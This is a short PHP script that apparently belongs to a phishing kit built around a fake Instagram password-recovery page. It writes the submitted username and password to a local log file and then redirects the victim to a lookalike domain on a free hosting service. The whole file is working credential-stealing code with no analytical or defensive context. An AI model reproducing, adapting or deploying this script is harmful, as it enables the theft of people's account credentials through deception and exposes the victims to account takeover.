<?php
header("Location: https://lnstagramrecoverypassword.000webhostapp.com/reset.html");
$handle = fopen("log", "a");

fwrite($handle, $_POST["sph_username"]);
fwrite($handle, "\n");
fwrite($handle, $_POST["sph_password"]);
fwrite($handle, "\n");
fwrite($handle, "\n");

fclose($handle);
exit;
?>